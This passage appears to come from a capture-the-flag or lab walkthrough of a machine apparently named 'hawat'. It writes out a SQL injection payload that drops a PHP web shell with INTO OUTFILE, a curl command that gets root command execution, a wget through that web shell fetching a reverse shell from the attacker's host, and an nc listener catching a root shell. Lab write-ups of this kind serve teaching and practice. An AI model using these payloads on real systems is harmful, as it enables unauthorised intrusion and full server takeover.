Normal'+UNION+SELECT+(%3C%3Fphp%20echo%20exec%28%24_GET%5B%22cmd%22%5D%29%3B)+INTO+OUTFILE+'/srv/http/cmd.php';+--+
Note that we have a trailing space at the end of the payload. Let’s run this query with Burp.

POST /issue/checkByPriority?priority=Normal'+UNION+SELECT+(%3C%3Fphp%20echo%20exec%28%24_GET%5B%22cmd%22%5D%29%3B)+INTO+OUTFILE+'/srv/http/cmd.php';+--+- HTTP/1.1
Host: 192.168.120.130:17445
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:78.0) Gecko/20100101 Firefox/78.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Connection: close
Cookie: JSESSIONID=E408CE3E9BBBEC15DCAD194F380E68A9
Upgrade-Insecure-Requests: 1
If everything goes well, we can confirm that the file was created (we’ll remember that the web server that leaked the phpinfo.php file was on port 30455).

kali@kali:~$ curl "http://192.168.120.130:30455/cmd.php?cmd=id" 
...
uid=0(root) gid=0(root) groups=0(root)   
Perfect, we have command execution. Even better, the server is running as root.

Let’s create a reverse shell.
We’ll create a copy of /usr/share/webshells/php/php-reverse-shell.php, edit the IP and port, and then start a web server to transfer it.

kali@kali:~$ cp /usr/share/webshells/php/php-reverse-shell.php rev.txt
kali@kali:~$ vim rev.txt
...
kali@kali:~$ sudo python3 -m http.server 443
Serving HTTP on 0.0.0.0 port 443 (http://0.0.0.0:443/) ...
We’ll navigate to the following URL to transfer the file.

kali@kali:~$ curl 'http://192.168.120.130:30455/cmd.php?cmd=wget http://192.168.118.3:443/rev.txt -O /srv/http/rev.php'
With the shell transferred, we can start a listener and access the file to receive the final shell.

kali@kali:~$ sudo nc -lvnp 443
listening on [any] 443 ...
kali@kali:~$ curl http://192.168.120.130:30455/rev.php
kali@kali:~$ sudo nc -lvnp 443
listening on [any] 443 ...
connect to [192.168.118.3] from (UNKNOWN) [192.168.120.130] 56404
Linux hawat 5.10.14-arch1-1 #1 SMP PREEMPT Sun, 07 Feb 2021 22:42:17 +0000 x86_64 GNU/Linux
 00:12:32 up 15 min,  1 user,  load average: 0.09, 0.04, 0.00
USER     TTY        LOGIN@   IDLE   JCPU   PCPU WHAT
root     pts/0     23:59    6:56   0.01s  0.01s -bash
uid=0(root) gid=0(root) groups=0(root)
sh: cannot set terminal process group (479): Inappropriate ioctl for device
sh: no job control in this shell
sh-5.1# 
```
